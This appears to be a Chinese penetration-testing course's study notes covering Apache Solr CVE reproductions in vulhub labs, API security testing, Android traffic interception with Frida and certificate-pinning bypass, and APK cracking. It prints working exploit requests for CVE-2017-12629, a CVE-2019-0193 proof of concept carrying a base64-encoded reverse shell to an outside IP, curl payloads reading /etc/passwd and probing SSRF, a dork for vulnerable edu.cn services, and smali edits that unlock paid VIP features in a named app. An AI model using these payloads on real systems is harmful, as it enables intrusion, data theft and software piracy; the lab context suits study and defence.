+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Solr是一个开源的搜索服务，使用Java语言开发，主要基于HTTP和Apache Lucene实现的。Solr是一个高性能，采用Java5开发，基于Lucene的全文搜索服务器。</span><br><span class="line"> </span><br><span class="line">漏洞：https://avd.aliyun.com/search?q=solr</span><br><span class="line">远程命令执行RCE（CVE-2017-12629）</span><br><span class="line">远程命令执行XXE（CVE-2017-12629）</span><br><span class="line">任意文件读取AND命令执行（CVE-2019-17558）</span><br><span class="line">远程命令执行漏洞(CVE-2019-0192)</span><br><span class="line">远程命令执行漏洞(CVE-2019-0193)</span><br><span class="line">未授权上传漏洞(CVE-2020-13957)</span><br><span class="line">Apache Solr SSRF (CVE-2021-27905)</span><br><span class="line">1、远程命令执行RCE（CVE-2017-12629）</span><br><span class="line">影响版本：Apache solr&lt;7.1.0版本</span><br><span class="line">语法：app=&quot;APACHE-Solr&quot; &amp;&amp; title==&quot;Solr Admin&quot;</span><br><span class="line"> </span><br><span class="line">启动环境：</span><br><span class="line">cd /vulhub-master/solr/CVE-2017-12629-RCE</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"> </span><br><span class="line">参考：https://vulhub.org/#/environments/solr/CVE-2017-12629-RCE/</span><br><span class="line"> </span><br><span class="line">访问：http://192.168.233.128:8983/solr/#/</span><br><span class="line">访问特定地址进行抓包：</span><br><span class="line">http://192.168.233.128:8983/solr/demo/config</span><br><span class="line">POST提交：&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch /tmp/success&quot;]&#125;&#125;</span><br><span class="line">执行的命令是：touch /tmp/success</span><br><span class="line">数据包：</span><br><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: 192.168.233.128:8983</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 158</span><br><span class="line"> </span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch /tmp/success&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">但是失败了，然后按照官方的原封不动的发：</span><br><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: 192.168.233.128:8983</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 158</span><br><span class="line"> </span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch /tmp/success&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入docker环境查看是否成功：</span><br><span class="line">进入：sudo docker-compose exec solr bash</span><br><span class="line">查看：ls /tmp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、任意文件读取AND命令执行（CVE-2019-17558）</span><br><span class="line">影响版本：Apache Solr 5.0.0版本至8.3.1</span><br><span class="line"> </span><br><span class="line">环境：https://vulfocus.cn/#/dashboard?image_id=0c32e104-8afe-433d-8b10-904d18704bef</span><br><span class="line"> </span><br><span class="line">利用脚本：https://github.com/jas502n/solr_rce</span><br><span class="line"> </span><br><span class="line">这个脚本采用了python2开发，用到虚拟机的python2环境。</span><br><span class="line">执行命令：</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">也可以进行批量测试，修改solr_rce.py文件</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3、远程命令执行漏洞(CVE-2019-0193)</span><br><span class="line">影响版本：Apache Solr &lt; 8.2.0版本</span><br><span class="line">需要登录才能利用。</span><br><span class="line"> </span><br><span class="line">启动环境：</span><br><span class="line">cd /vulhub-master/solr/CVE-2019-0193</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">参考：https://vulhub.org/#/environments/solr/CVE-2019-0193/</span><br><span class="line"> </span><br><span class="line">访问：http://192.168.233.128:8983/solr/#/</span><br><span class="line">默认是没有test的，在执行：sudo docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">把poc进行复制：</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type=&quot;URLDataSource&quot;/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          function poc()&#123; java.lang.Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name=&quot;stackoverflow&quot;</span><br><span class="line">            url=&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span><br><span class="line">            processor=&quot;XPathEntityProcessor&quot;</span><br><span class="line">            forEach=&quot;/feed&quot;</span><br><span class="line">            transformer=&quot;script:poc&quot; /&gt;</span><br><span class="line">  &lt;/document&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br><span class="line"> </span><br><span class="line">其中YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ==是反弹命令base64编码。</span><br><span class="line">反弹命令：bash -i &gt;&amp; /dev/tcp/175.178.151.29/5566 0&gt;&amp;1</span><br><span class="line">base64：YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=</span><br><span class="line"> </span><br><span class="line">然后在点击execute with this configuration</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4、Apache Solr 文件读取&amp;SSRF (CVE-2021-27905)</span><br><span class="line"> </span><br><span class="line">启动环境：</span><br><span class="line">cd /vulhub-master/solr/Remote-Streaming-Fileread</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"> </span><br><span class="line">访问：http://192.168.233.128:8983/solr/#!/</span><br><span class="line">1、获取数据库名</span><br><span class="line">http://192.168.233.128:8983/solr/admin/cores?indexInfo=false&amp;wt=json</span><br><span class="line">数据库名：demo</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、访问触发</span><br><span class="line">curl -i -s -k -X $&#x27;POST&#x27; \</span><br><span class="line">    -H $&#x27;Content-Type: application/json&#x27; --data-binary $&#x27;&#123;\&quot;set-property\&quot;:&#123;\&quot;requestDispatcher.requestParsers.enableRemoteStreaming\&quot;:true&#125;&#125;&#x27; \</span><br><span class="line">    $&#x27;http://192.168.233.128:8983/solr/demo/config&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3、任意文件读取</span><br><span class="line">curl -i -s -k &#x27;http://192.168.233.128:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">为什么说也是ssrf漏洞，是因为用到了file协议去读取，这样也可以进行内网探针，比如把file协议进行修改为http协议。看支不支持http协议可以用dnslog来进行判断。</span><br><span class="line">curl -i -s -k &#x27;http://192.168.233.128:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=http://2e8m2t.dnslog.cn&#x27;</span><br><span class="line"> </span><br><span class="line">执行能接受到反弹，所以支持http协议。</span><br></pre></td></tr></table></figure>
+
+<h1 id="第65天-API安全-接口安全-WebPack-REST-SOAP-WSDL-WebService"><a href="#第65天-API安全-接口安全-WebPack-REST-SOAP-WSDL-WebService" class="headerlink" title="第65天 API安全-接口安全&amp;WebPack&amp;REST&amp;SOAP&amp;WSDL&amp;WebService"></a>第65天 API安全-接口安全&amp;WebPack&amp;REST&amp;SOAP&amp;WSDL&amp;WebService</h1><h3 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h3><p>1.HTTP类接口-测评<br>2.RPC类接口-测评<br>3.Web Service类-测评<br>参考链接：<a href="https://www.jianshu.com/p/e48db27d7c70">https://www.jianshu.com/p/e48db27d7c70</a></p>
+<h4 id="内容点：-1"><a href="#内容点：-1" class="headerlink" title="内容点："></a>内容点：</h4><p>SOAP(Simple Object Access Protocol)简单对象访问协议是交换数据的一种协议规范，<br>是一种轻量的、简单的、基于XML（标准通用标记语言下的一个子集）的协议，它被设计<br>成在WEB上交换结构化的和固化的信息，SOAP不是Web Servicet的专有协议，<br>SOAP使用HTTP来发送XML格式的数据，可以简单理解为：SOAP&#x3D;HTTP+XML</p>
+<p>REST(Representational State Transfer)即表述性状态传递，在三种主流的Web服务实<br>现方案中，因为REST模式的Wb服务与复杂的SOAP和XML-RPC对比来讲明显的更加简<br>洁，越来越多的Web服务开始采用REST风格设计和实现。例如，Amazon.com提供接近<br>REST风格的Web服务进行图书查找；雅虎提供的Web服务也是REST风格的。</p>
+<p>WSDL(Web Services Description Language)即网络服务描述语言，用于描述Web服务<br>的公共接口。这是一个基于XML的关于如何与Wb服务通讯和使用的服务描述；也就是描<br>述与目录中列出的Wb服务进行交互时需要绑定的协议和信息格式。通常采用抽象语言描<br>述该服务支持的操作和信息，使用的时候再将实际的网络协议和信息格式绑定给该服务。</p>
+<h4 id="接口数据包："><a href="#接口数据包：" class="headerlink" title="接口数据包："></a>接口数据包：</h4><p>Method:请求方法<br>攻击方式：OPTIONS,PUT,MOVE,DELETE<br>效果：上传恶意文件，修改页面等<br>URL:唯一资源定位符<br>攻击方式：猜测，遍历，跳转<br>效果：未授权访问等<br>Params:请求参数<br>攻击方式：构造参数，修改参数，遍历，重发<br>效果：爆破，越权，未授权访问，突破业务逻辑等<br>Authorization:认证方式<br>攻击方式：身份伪造，身份篡改<br>效果：越权，未授权访问等<br>Headers:清求消息头<br>攻击方式：拦截数据包，改Hosts,<br>改Referer,改Content-Type等<br>效果：绕过身份认证，绕过Referer验证，绕过类型验证，DDOS等<br>Body:消息体<br>攻击方式：SQL注入，XML注入，反序列化等<br>效果：提权，突破业务逻辑，未授权访问等</p>
+<p>安全问题：<br>XSS跨站，信息泄露，暴力破解，文件上传，未授权访问，JWT授权认证，接口滥用等</p>
+<p>演示案例：<br>WebService:类-Wsdl&amp;ReadyAP-SQL注入<br>SOAP类-Swagger&amp;SoapUla&amp;EXP-信息泄露<br>HTTP类-WebPack&amp;PackerFuzzer-信息泄露</p>
+<p>WebService-Wsdl&amp;SoapUl<br>探针：?wsdl<br>利用：SoapUla&amp;ReadyAPI<br>思路：使用googlehack语法查找可能含有漏洞的资产 edu.cn inurl:asmx?wsdl<br>使用工具readyAPI进行扫描—扫描出存在sql注入–sqlmap一把梭</p>
+<p>SOAP-Swagger&amp;SoapUl&amp;EXP<br>探针：目录&amp;S资源<br>利用：SoapUla&amp;EXP<br><a href="https://github.com/lijiejie/swagger-exp">https://github.com/lijiejie/swagger-exp</a><br><a href="https://github.com/jayus0821/swagger-hack">https://github.com/jayus0821/swagger-hack</a><br>目录:<br>&#x2F;swagger<br>&#x2F;api&#x2F;swagger<br>&#x2F;swagger&#x2F;ui<br>&#x2F;api&#x2F;swagger&#x2F;ui<br>&#x2F;swagger-ui.html<br>&#x2F;api&#x2F;swagger-ui.html<br>&#x2F;user&#x2F;swagger-ui.html<br>&#x2F;libs&#x2F;swaggerui<br>&#x2F;api&#x2F;swaggerui<br>&#x2F;swagger-resources&#x2F;configuration&#x2F;ui<br>&#x2F;swagger-resources&#x2F;configuration&#x2F;security<br>思路同上 使用swagger-hack.py脚本</p>
+<p>#HTTP-Webpack&amp;PackerFuzzer<br>探针：插件&amp;JS资源<br>利用：PackerFuzzer<br><a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p>
+<h1 id="第66天-API安全-接口安全-阿里云KEY-postman-DVWS-XEE-鉴权-泄露"><a href="#第66天-API安全-接口安全-阿里云KEY-postman-DVWS-XEE-鉴权-泄露" class="headerlink" title="第66天 API安全-接口安全&amp;阿里云KEY%postman&amp;DVWS&amp;XEE&amp;鉴权&amp;泄露"></a>第66天 API安全-接口安全&amp;阿里云KEY%postman&amp;DVWS&amp;XEE&amp;鉴权&amp;泄露</h1><p>知识点<br>1.HTTP类接口-测评<br>2.RPC类接口-测评<br>3.Web Service类-测评<br>参考链接：<a href="https://www.jianshu.com/p/e48db27d7c70">https://www.jianshu.com/p/e48db27d7c70</a></p>
+<p>内容点：<br>SOAP(Simple Object Access Protocol)简单对象访问协议是交换数据的一种协议规范，<br>是一种轻量的、简单的、基于XML（标准通用标记语言下的一个子集）的协议，它被设计<br>成在WEB上交换结构化的和固化的信息，SOAP不是Web Servicet的专有协议，<br>SOAP使用HTTP来发送XML格式的数据，可以简单理解为：SOAP&#x3D;HTTP+XML</p>
+<p>REST(Representational State Transfer)即表述性状态传递，在三种主流的Web服务实<br>现方案中，因为REST模式的Wb服务与复杂的SOAP和XML-RPC对比来讲明显的更加简<br>洁，越来越多的Web服务开始采用REST风格设计和实现。例如，Amazon.com提供接近<br>REST风格的Web服务进行图书查找；雅虎提供的Web服务也是REST风格的。</p>
+<p>WSDL(Web Services Description Language)即网络服务描述语言，用于描述Web服务<br>的公共接口。这是一个基于XML的关于如何与Wb服务通讯和使用的服务描述；也就是描<br>述与目录中列出的Wb服务进行交互时需要绑定的协议和信息格式。通常采用抽象语言描<br>述该服务支持的操作和信息，使用的时候再将实际的网络协议和信息格式绑定给该服务。</p>
+<p>接口数据包：<br>Method:请求方法<br>攻击方式：OPTIONS,PUT,MOVE,DELETE<br>效果：上传恶意文件，修改页面等<br>URL:唯一资源定位符<br>攻击方式：猜测，遍历，跳转<br>效果：未授权访问等<br>Params:请求参数<br>攻击方式：构造参数，修改参数，遍历，重发<br>效果：爆破，越权，未授权访问，突破业务逻辑等<br>Authorization:认证方式<br>攻击方式：身份伪造，身份篡改<br>效果：越权，未授权访问等<br>Headers:清求消息头<br>攻击方式：拦截数据包，改Hosts,<br>改Referer,改Content-Type等<br>效果：绕过身份认证，绕过Referer验证，绕过类型验证，DDOS等<br>Body:消息体<br>攻击方式：SQL注入，XML注入，反序列化等<br>效果：提权，突破业务逻辑，未授权访问等</p>
+<p>安全问题：<br>XSS跨站，信息泄露，暴力破解，文件上传，未授权访问，JWT授权认证，接口滥用等</p>
+<p>演示案例：<br>工具使用-Postman自动化汉测试<br>安全问题-Dvws泄世漏&amp;鉴权&amp;XE<br>安全问题-阿里KEY信息泄漏利用<br>应用方向-违法APP打包接口分析</p>
+<p>工具使用-Postman自动化测试<br><a href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a></p>
+<h4 id="安全问题-Dvws世是-鉴权-OXE"><a href="#安全问题-Dvws世是-鉴权-OXE" class="headerlink" title="安全问题-Dvws世是&amp;鉴权&amp;OXE"></a>安全问题-Dvws世是&amp;鉴权&amp;OXE</h4><p><a href="https://github.com/snoopysecurity/dvws-node">https://github.com/snoopysecurity/dvws-node</a><br>1、注册时抓包可尝试修改admin为ture，看看能否绕过jwt验证<br>登录返回的数据包为admin，false</p>
+<p>修改登录数据包为admin&#x3D;true</p>
+<p>2、通过数据包中body的格式判断提交请求的格式为xml格式，尝试是否存在XXE漏洞，利用XXE可以实现读取文件、若误回显可以尝试外部实体注入或者使用dnslog检测漏洞存在<br>复现：在用户数据搜索出抓包，看到格式为xml格式，尝试使用xxe漏洞读取到文件</p>
+<p>安全问题-阿里云KEY信息池漏利用<br><a href="https://yun.cloudbility.com/">https://yun.cloudbility.com/</a><br><a href="https://github.com/mrknow001/aliyun-accesskey-Tools">https://github.com/mrknow001/aliyun-accesskey-Tools</a><br>接口配置文件泄漏导致云资源生机受控<br>目前为止，云服务器已经占据了服务器的大部分市场，由于云服务器易管理，操作性强，安全程度高。很多大型厂商都选择将资产部署在云服务上，但安全的同时由于运维人员的疏忽也会导致一些非预期的突破口。当云产品Accesskey在调用过程中，出现泄漏会导致对象控制资源全部被控，影响严重！<br>1、常规获取Accesskey方式<br>-通过源码泄漏配置文件<br>-通过应用程序报错读取<br>-通过JS文件引用中获取<br>如图：页面报错</p>
+<h5 id="应用方向违法APP打包接口分析"><a href="#应用方向违法APP打包接口分析" class="headerlink" title="应用方向违法APP打包接口分析"></a>应用方向违法APP打包接口分析</h5><p>完整的分析流程：burp抓包找到真实访问的域名地址—通过信息收集到含有使用webpack组件的网站<br>–使用&#x2F;Packer-Fuzzer工具扫描</p>
+<h1 id="第67天-APP攻防-Frida反证书抓包-移动安全系统-资产提取-评估扫描"><a href="#第67天-APP攻防-Frida反证书抓包-移动安全系统-资产提取-评估扫描" class="headerlink" title="第67天 APP攻防-Frida反证书抓包&amp;移动安全系统&amp;资产提取&amp;评估扫描"></a>第67天 APP攻防-Frida反证书抓包&amp;移动安全系统&amp;资产提取&amp;评估扫描</h1><h4 id="知识点：-44"><a href="#知识点：-44" class="headerlink" title="知识点："></a>知识点：</h4><p>1、资产提权-AppinfoScanner<br>2、评估框架-MobSF&amp;mobexler<br>3、抓包利器-Frida&amp;rOcapture</p>
+<h4 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h4><p>1、信息收集-应用&amp;资产提取&amp;权限等<br>2、漏洞发现反编译&amp;脱壳&amp;代码审计<br>3、安全评估-组件&amp;敏感密匙&amp;恶意分析</p>
+<h4 id="核心点："><a href="#核心点：" class="headerlink" title="核心点："></a>核心点：</h4><p>0、内在点资产提取&amp;版本&amp;信息等<br>1、抓包点-反代理&amp;反证书&amp;协议等<br>2、逆向点-反编译&amp;脱壳&amp;重打包等<br>3、安全点资产&amp;接口8漏洞&amp;亩计等</p>
+<h4 id="演示案例：-38"><a href="#演示案例：-38" class="headerlink" title="演示案例："></a>演示案例：</h4><p>内在-资产提取-AppinfoScanner<br>内在-安全评估-MobSF&amp;mobexler<br>外在-证书抓包-Frida-server&amp;rOcapture</p>
+<h4 id="内在-资产提取-Appinfoscanner"><a href="#内在-资产提取-Appinfoscanner" class="headerlink" title="内在-资产提取-Appinfoscanner"></a>内在-资产提取-Appinfoscanner</h4><p>Appinfoscanner一款适用于以HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、<br>iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、<br>红队成员快速收集到移动端或奢静态WEB站点中关键的资产信惠并提供基本的信息输出，<br>如：Title、Domain、CDN、撞纹信息、状态信息等.<br>httpslgithub.com&#x2F;kelvinBen&#x2F;AppinfoScanner</p>
+<h4 id="内在-安全评估-MobsF-mobexler"><a href="#内在-安全评估-MobsF-mobexler" class="headerlink" title="内在-安全评估-MobsF&amp;mobexler"></a>内在-安全评估-MobsF&amp;mobexler</h4><p>移动安全框爆（MobsF）是一种自动化的一体化移动应用程序（AndroidiosWindows）渗<br>透测试、恶意软件分析和安全评估框案，能够执行静态和动态分析，MobSF支持移动应用<br>程序二进制文件（APK、XAPK、IPA和APPX）以及压缩源代码，并视供RESTAPI以与<br>您的CI&#x2F;CD或DevSecOps管道无缝集成。动态分析器可帮助您执行运行时安全评估和交<br>互式仪器浏试。<br>-Mobexler是基于ElementaryOs的定制虚拟机，盲在带助进行Android和iOs应用程序的渗<br>透测试。Mobexler预装了各种开源工具，脚本，黑密必备件等，这些部是安全测试<br>Androld和ios应用程序所必需的.<br>https:l&#x2F;mobexler.com&#x2F;<br>https:&#x2F;lgithub.com&#x2F;MobsF&#x2F;Mobile-Security-Framework-MobsF<br>dockerpullopensecurity&#x2F;mobile-secunity-framework-mobst<br>docker run -it -p 8008:8000 opensecurity&#x2F;mobile-security-framework-mobsf:latest</p>
+<h4 id="外在-证书抓包-frida-server-rocapture"><a href="#外在-证书抓包-frida-server-rocapture" class="headerlink" title="外在-证书抓包-frida-server&amp;rocapture"></a>外在-证书抓包-frida-server&amp;rocapture</h4><p>-r0capture仅限安卓平台，测试安卓7、8、9、10、11 可用 ;<br>无视所有证书校验或绑定，不用考虑任何证书的事情；<br>通杀TCP&#x2F;P四层模型中的应用层中的全部协议；<br>通杀协议包括：Http,Websocket,Ftp,Xmpp,Imap,Smtp,Protobu等、及它们的ssL版本;<br>通杀所有应用层框架，包括HttpUrlConnection、Okhttp1&#x2F;3&#x2F;4、Retrofit&#x2F;Volley等等;<br>无视加固，不管是整体壳还是二代壳或VMP，不用考虑加固的事情;<br>-Firda 是一款易用的跨平 Hook 工具，Java 层到 Native 层的 Hook 无所不能，是一种 动<br>态的插桩工具，可以插入代码到原生App的内存空间中，动态的去监视和修改行为，原生<br>平台包括Win、Mac、Linux、Android、ios全平台。</p>
+<p>测试环境：<br>Windows10Python3.7夜神模拟器rocapturefrida-serverwireshark<br><a href="https://lgithub.com/roysue/rocapture">https://lgithub.com/roysue/rocapture</a><br><a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a></p>
+<p>3、转发并启动Frida<br>adbforwardtcp:27042tcp:27042<br>连接判断: frida-ps-U frida-ps-R<br>4、获取包名并运行抓包<br>获取包名：Is&#x2F;data&#x2F;data或ApkMessenger<br>python rocapture.py-U -f包名-p xxxx.pcap</p>
+<h1 id="第68天-APP攻防-Xposed-Frida-Hook-证书校验-反代理-代理转发"><a href="#第68天-APP攻防-Xposed-Frida-Hook-证书校验-反代理-代理转发" class="headerlink" title="第68天 APP攻防-Xposed&amp;Frida&amp;Hook&amp;证书校验&amp;反代理&amp;代理转发"></a>第68天 APP攻防-Xposed&amp;Frida&amp;Hook&amp;证书校验&amp;反代理&amp;代理转发</h1><h4 id="知识点：-45"><a href="#知识点：-45" class="headerlink" title="知识点："></a>知识点：</h4><p>1、APP防代理绕过-应用&amp;转发<br>2、APP证书校验类型-单向&amp;双向<br>3、APP证书校验绕过-Frida&amp;XP框架等</p>
+<h4 id="章节点：-1"><a href="#章节点：-1" class="headerlink" title="章节点："></a>章节点：</h4><p>1、信息收集-应用&amp;资产提取&amp;权限等<br>2、漏洞发现-反编译&amp;脱壳&amp;代码审计<br>3、安全评估-组件&amp;敏感密匙&amp;恶意分析</p>
+<h4 id="核心点：-1"><a href="#核心点：-1" class="headerlink" title="核心点："></a>核心点：</h4><p>0、内在点-资产提取&amp;版本&amp;信息等<br>1、抓包点-反代理&amp;反证书&amp;协议等<br>2、逆向点-反编译&amp;脱壳&amp;重打包等<br>3、安全点-资产&amp;接口&amp;漏洞&amp;审计等</p>
+<h4 id="演示案例：-39"><a href="#演示案例：-39" class="headerlink" title="演示案例："></a>演示案例：</h4><p>某牛牛防抓包-xposed&amp;frida&amp;rOcapture<br>某社交防抓包-Proxifier&amp;frida&amp;rocapture</p>
+<h4 id="反代理绕过："><a href="#反代理绕过：" class="headerlink" title="反代理绕过："></a>反代理绕过：</h4><p><a href="https://zone.huoxian.cn/d/440-app">https://zone.huoxian.cn/d/440-app</a><br>1、自身的抓包应用<br>2、Proxifier转发使用<br>思路：<br>1、先使用模拟器中的代理软件检测app是否有防代理机制，若存在则考虑在宿主机上采用proxifier转发模拟器的数据包到burp绕过反代理的检测机制<br>2、若通过上述手段后app仍显示网路错误，但是burp中显示一两个数据包，则是验证了证书，若想要绕过证书可采用以下三种方法，安装xposed框架–安装绕过代理、绕过证书应用–开启proxifier代理转发</p>
+<h4 id="证书校验绕过："><a href="#证书校验绕过：" class="headerlink" title="证书校验绕过："></a>证书校验绕过：</h4><p>情况1，客户端不存在证书校验，服务器也不存在证书校验，<br>情况2，客户端存在校验服务端证书，服务器也不存在证书校验，单项校验。<br>情况3、客户端存在证书校验，服务器也存在证书校验，双向校验。<br>1、Frida&amp;rocapture底层<br>2、Xposed&amp;JustTrust&amp;HOOK<br>3、反编译逆向提取证书重编打包</p>
+<p>探探APP测试：1、先尝试模拟器代理转发数据到burp（显示网络连接异常）<br>2、尝试使用proxifier代理转发模拟器的数据包到burp（有数据包但是因为转发速度限制仍存在问题）<br>3、使用xposed尝试绕过反代理和证书</p>
+<p>夜神模拟器和逍遥模拟器<br>有些应用存在反虚拟机功能，检测到为虚拟机时会打不开应用，夜神模拟器可以绕过反vm检测</p>
+<h1 id="第69天-APP攻防-反编译-查壳脱壳-重打包签名-修改次数会员版权限制"><a href="#第69天-APP攻防-反编译-查壳脱壳-重打包签名-修改次数会员版权限制" class="headerlink" title="第69天 APP攻防-反编译&amp;查壳脱壳&amp;重打包签名&amp;修改次数会员版权限制"></a>第69天 APP攻防-反编译&amp;查壳脱壳&amp;重打包签名&amp;修改次数会员版权限制</h1><h4 id="知识点：-46"><a href="#知识点：-46" class="headerlink" title="知识点："></a>知识点：</h4><p>1、APP防代理绕过-应用&amp;转发<br>2、APP证书校验类型-单向&amp;双向<br>3、APP证书校验绕过-Frida&amp;XP框架等</p>
+<h4 id="章节点：-2"><a href="#章节点：-2" class="headerlink" title="章节点："></a>章节点：</h4><p>1、信息收集-应用&amp;资产提取&amp;权限等<br>2、漏洞发现-反编译&amp;脱壳&amp;代码审计<br>3、安全评估-组件&amp;敏感密匙&amp;恶意分析</p>
+<h4 id="核心点：-2"><a href="#核心点：-2" class="headerlink" title="核心点："></a>核心点：</h4><p>0、内在点-资产提取&amp;版本&amp;信息等<br>1、抓包点-反代理&amp;反证书&amp;协议等<br>2、逆向点-反编译&amp;脱壳&amp;重打包等<br>3、安全点-资产&amp;接口&amp;漏洞&amp;审计等</p>
+<h4 id="演示案例：-40"><a href="#演示案例：-40" class="headerlink" title="演示案例："></a>演示案例：</h4><p>反编译加固-自动查壳脱壳<br>功能修改-反编译&amp;次数&amp;会员<br>功能修改-反编译&amp;图标&amp;信息<br>打包编译证书签名&amp;重打包等</p>
+<p>反编译加固-自动查壳脱壳<br><a href="https://github.com/CodingGay/BlackDex">https://github.com/CodingGay/BlackDex</a><br>查壳：ApkScan-PWD<br>脱壳：BlackDex</p>
+<h4 id="功能修改-反编译-次数-会员"><a href="#功能修改-反编译-次数-会员" class="headerlink" title="#功能修改-反编译&amp;次数&amp;会员"></a>#功能修改-反编译&amp;次数&amp;会员</h4><p>贵妃APP实战：<br>思路：功能每日观看次数处尝试修改手机型号、IEMI值可绕过次数限制<br>修改get_is_svip为1，使得用户默认为svip<br>-次数：<br>逻辑：修改手机型号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.method public getRe_today_view_times(Ljava/lang/String;</span><br><span class="line">	.locals 1</span><br><span class="line">	.line 307</span><br><span class="line">	iget-object vo,po,Lcom/ufozfnxzqm/dvbphwfo/entity/Userlnfo;-</span><br><span class="line">re_today_view_times:Ljava/lang/String;</span><br></pre></td></tr></table></figure>
+
+<p>会员：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.method public getls_vip（）I</span><br><span class="line">	.locals 1</span><br><span class="line">	.line 347</span><br><span class="line">	.iget vo,p0,Lcom/ufozfnxzqm/dvbphwfo/entity/Userlnfo;-&gt;is vip:I</span><br><span class="line">	const/4 vo.0x</span><br><span class="line">	return vo</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure>
+
+<h4 id="功能修改-反编译-图标-信息"><a href="#功能修改-反编译-图标-信息" class="headerlink" title="功能修改-反编译&amp;图标&amp;信息"></a>功能修改-反编译&amp;图标&amp;信息</h4><p>使用安卓修改大师修改图标和信息，还可以修改app权限获取收集通讯录等</p>
+<h1 id="第70天-APP攻防-微信小程序-解包反编译-数据抓包-APK信息资源提取"><a href="#第70天-APP攻防-微信小程序-解包反编译-数据抓包-APK信息资源提取" class="headerlink" title="第70天 APP攻防-微信小程序&amp;解包反编译&amp;数据抓包&amp;APK信息资源提取"></a>第70天 APP攻防-微信小程序&amp;解包反编译&amp;数据抓包&amp;APK信息资源提取</h1><h4 id="知识点：-47"><a href="#知识点：-47" class="headerlink" title="知识点："></a>知识点：</h4><p>1、APK信息资源提取<br>2、微信小程序致据抓包<br>3、做信小程序解包反编译</p>
+<p>1、信息收集应用8资产提取&amp;权限等<br>2、漏润发现-反编泽&amp;脱壳&amp;代码审计<br>3、安全评估组件8散密匙&amp;思意分析</p>
